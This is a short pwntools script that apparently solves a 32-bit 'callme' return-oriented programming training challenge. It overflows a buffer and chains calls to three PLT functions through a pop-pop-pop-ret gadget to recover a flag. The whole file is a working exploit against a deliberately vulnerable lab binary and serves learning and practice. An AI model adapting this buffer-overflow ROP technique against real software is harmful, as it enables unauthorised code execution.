from pwn import *

e = ELF('./callme32')
p = e.process()

print(p.recv().decode())

# raw_input('attach gdb')

padding = b'A' * 44

# callme_one@plt
one = p32(0x80485c0)

# callme_two@plt
two = p32(0x8048620)

# callme_three@plt
three = p32(0x80485b0)

# pop; pop; pop; ret; gadget
gadget = p32(0x080488a9)

# args to all funcs
args = p32(0x1) + p32(0x2) + p32(0x3)

payload = padding
payload += one
payload += gadget
payload += args
payload += two
payload += gadget
payload += args
payload += three
payload += gadget
payload += args

p.sendline(payload)

flag = p.recv().decode()
success(flag)
